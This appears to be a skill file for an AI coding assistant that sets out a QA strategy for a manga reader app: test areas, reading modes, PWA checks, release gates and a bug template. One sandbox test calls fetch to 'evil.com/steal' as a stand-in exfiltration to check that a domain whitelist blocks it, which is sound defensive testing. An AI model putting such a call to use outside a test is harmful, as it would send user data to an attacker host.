---
name: manga-qa
description: Define testing strategy, create test plans, and ensure quality across all manga reader features
---

# Manga QA / 质量保证

## Activation / 激活条件

Triggers when user discusses:
- Testing strategies or test planning
- Bug reports and quality issues
- Verification before release
- Quality metrics or coverage
- "How do I test this feature?"

Chinese triggers: "测试", "QA", "验证", "bug", "质量", "检查"

## Purpose / 目的

Ensure comprehensive quality coverage for the manga reader's unique features: source script execution, reading modes, gamification, PWA functionality, and cross-platform compatibility.

## Quality Domains / 质量领域

### 1. Source Script System / 书源系统

**Critical Path**: User searches → scripts execute → results display → details fetch → chapter images → reading

**Test Areas**:
- Script loading and caching
- Web Worker sandbox isolation (security)
- Search result parsing and normalization
- Error handling (network, malformed scripts)
- Performance under load (concurrent searches)

**Sample Test Cases**:
```typescript
describe('Source Script Execution', () => {
  it('loads script and registers search function', async () => {
    const script = await sourceManager.loadScript('site-example')
    expect(script.search).toBeType('function')
  })

  it('returns normalized ComicSearchResult[]', async () => {
    const results = await script.search('naruto', 1)
    expect(results).toBeArray()
    expect(results[0]).toMatchSchema({
      title: expect.string,
      coverUrl: expect.string,
      comicId: expect.string,
      source: expect.string
    })
  })

  it('enforces domain whitelist in sandbox', async () => {
    await expect(
      sandbox.execute('fetch", "https://evil.com/steal")
    ).rejects.toThrow('Domain not whitelisted')
  })
})
```

### 2. Reading Modes / 阅读模式

Four modes need individual attention:

#### Scroll Mode (竖向滚动)
- Smooth scrolling behavior
- Preloading adjacent images (2-3 screens ahead)
- Scroll position restoration on navigation
- Scroll-to-chapter-bottom detection

#### Paged Mode (左右翻页)
- Page flip animations (direction-aware)
- Page boundary handling (can't scroll between pages)
- Chapter transition (last page → next chapter)
- Double-tap zoom reset

#### Webtoon Mode (条漫模式)
- Continuous long image stitching
- Smooth scroll without page breaks
- Chapter transition seamless
- Memory: unload previous chapter images

#### Auto Mode (智能切换)
- Aspect ratio detection logic:
  - Width > height × 1.5 → webtoon
  - Height ≥ width × 1.2 → paged
  - Else → scroll
- Manual override persists by series

### 3. PWA Features / PWA功能

| Test Item / 测试项 | Expected / 预期 |
|-------------------|-----------------|
| Manifest valid JSON | loads in Chrome DevTools Application tab |
| Service worker registered | `navigator.serviceWorker.controller` exists |
| Install prompt appears | After 3 visits, 30s dwell time |
| Offline fallback | Cache-first for images, network-first for API |
| App shell loads | < 2s on 3G (measured) |
| Push notifications | Subscribe → receive test message |

### 4. Gamification / 游戏化

- Streak calculation date-based, not session-based
- Achievement unlock atomic (no duplicate unlocks)
- XP calculations match formula precisely
- Local storage transactions complete or rollback
- Edge cases: timezone changes, device clock manipulation

### 5. Continuity / 连续性

- Bookmark persistence across sessions
- "Continue Reading" correct ordering
- Update detection accurate (chapter count comparison)
- Background sync doesn't block UI
- Large library (500+ series) performance

### 6. Cross-Platform / 跨平台

| Platform / 平台 | Test Focus / 测试重点 |
|----------------|---------------------|
| Web (Chrome) | Full feature set, PWA install |
| Web (Safari) | PWA, iOS-specific bugs |
| Web (Firefox) | Compatibility, WebWorker support |
| Android (Capacitor) | Mixed content (HTTP sources), native plugins |
| iOS (Capacitor) | Safe area, notch, App Store guidelines |

## Test Structure / 测试结构

```
tests/
├── unit/                          # Unit tests (70%)
│   ├── composables/              # Vue composables
│   ├── utils/                    # Utility functions
│   ├── stores/                   # Pinia stores (gamification, reader)
│   ├── sandbox/                  # Worker message handling
│   └── source-manager/           # Script caching, validation
├── integration/                   # Integration tests (20%)
│   ├── search-flow.spec.ts       # Search → select → detail
│   ├── reader-navigation.spec.ts # Chapter → page navigation
│   ├── gamification-events.spec.ts # Achievement triggers
│   ├── pwa-offline.spec.ts       # Offline reading test
│   └── storage-migrations.spec.ts # Dexie version upgrades
└── e2e/                          # End-to-end tests (10%)
    ├── user-reading-flow.spec.ts
    ├── source-subscription.spec.ts
    ├── settings-theme.spec.ts
    └── install-pwa.spec.ts
```

## Testing Tools / 测试工具

- **Vitest** - Unit and integration tests (Vite-native)
- **Playwright** - E2E tests (multi-browser)
- **Lighthouse CI** - Performance budgets
- **Axe-core** - Accessibility scanning
- **Jest/DOM** - If migrating from Jest

## Test-Driven Workflow / 测试驱动工作流

For every new feature:

1. **Write Failing Test First**
   ```typescript
   // 1. Write test that exercises new behavior
   test('achievement unlocks when chapter 100 completed', async () => {
     const result = await achievementService.check('centurion')
     expect(result.unlocked).toBe(true)
   })

   // 2. Run test → confirms it fails (RED)
   // 3. Implement minimal code
   // 4. Run again → test passes (GREEN)
   // 5. Refactor (don't break green)
   // 6. Commit with proper message
   ```

2. **Coverage Requirements**
   - Unit: >80% line coverage
   - Integration: All critical paths covered
   - E2E: Core user journeys (P0 paths)

3. **Regression Prevention**
   Every bug fix must include:
   - Test that reproduces the bug (fails before fix)
   - Fix implementation
   - Test passes after fix
   - Optional: Property-based test for edge cases

## Pre-Commit Checklist / 提交前检查

Run these before `git commit` (hooks automate this):

```bash
# Type safety
pnpm typecheck

# Code quality
pnpm lint

# Unit tests
pnpm test:unit

# Integration tests (for multi-package changes)
pnpm test:integration
```

Hooks will warn on:
- TODOs without issue reference
- Hardcoded secrets/credentials
- Large files (>500KB) committed

## Release Certification / 发布认证

Before any release, QA Specialist must verify:

### Mandatory Gates / 强制关卡

| Gate / 关卡 | Criteria / 标准 |
|-------------|-----------------|
| Type Check | 0 errors |
| Lint | 0 warnings |
| Unit Tests | 100% passing |
| Integration Tests | 100% passing |
| E2E Tests | 0 critical failures |
| Performance | Search < 500ms, Page turn < 100ms |
| Accessibility | WCAG AA (contrast, focus states) |
| Cross-browser | Chrome, Firefox, Safari |
| Mobile | Android + iOS real device test |

### Optional Gates (By Platform) / 可选关卡
- Bundle size < 500KB gzipped
- Lighthouse score > 90
- Memory usage < 150MB sustained

## Bug Triage Template / Bug分类模板

When a bug is reported, classify using this framework:

```
Bug: [Title]

Severity:
- Critical: App crash, data loss, security breach
- Major: Feature broken, no workaround
- Minor: Feature broken with workaround
- Trivial: Cosmetic, typo

Priority:
- P0: Block release
- P1: Fix before next release
- P2: Fix when convenient
- P3: Nice to have

Reproduction Steps:
1.
2.
3.

Expected:
Actual:

Environment:
- Platform: [Web/Android/iOS]
- Browser/Version:
- Build: [commit hash or version]

Screenshots/Video: [attach]
```

## Quality Metrics / 质量指标

Track these KPIs:

| Metric / 指标 | Target / 目标 | Measurement / 测量 |
|---------------|---------------|-------------------|
| Test coverage | >80% | `vitest --coverage` |
| E2E pass rate | 100% | CI test reports |
| Production bugs | < 1 per week | Issue tracker |
| User crash rate | < 0.1% | Error monitoring |
| Install success rate | > 95% | PWA analytics |

---

*This skill provides the QA framework. Execute tests, track metrics, and gate releases based on these standards.*
